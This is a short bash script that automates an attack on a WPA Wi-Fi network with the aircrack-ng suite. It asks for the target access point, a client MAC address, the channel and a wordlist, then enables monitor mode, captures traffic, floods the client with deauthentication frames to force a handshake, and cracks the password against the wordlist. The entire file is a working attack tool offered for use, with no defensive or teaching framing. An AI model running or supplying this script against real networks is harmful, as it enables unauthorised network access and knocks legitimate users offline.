#! /bin/bash

#Made by offbyonelife 19/4/2025. VERSION: 1.0

#Uses aircrack-ng suite

clear

echo "Enter the BSSID (MAC ADDRESS) of the AP you are targeting: "
read AP_BSSID

echo "Enter one of the clients MAC ADDRESS: "
read CLIENT_MAC_ADDRESS

echo "Enter the channel the AP you are targeting is operating on: "
read AP_CHANNEL

echo "Enter the wordlist path of the wordlist you want to use to crack the AP's password: "
read WORDLIST_PATH

airmon-ng start wlan0

timeout 120s airodump-ng -c $AP_CHANNEL --bssid $AP_BSSID -w targetAP_PSK wlan0mon &

aireplay-ng --deauth 300 -a $AP_BSSID -c $CLIENT_MAC_ADDRESS wlan0mon

aircrack-ng -w $WORDLIST_PATH -b $AP_BSSID targetAP_PSK-01.cap

echo "PROGRAM FINISHED."



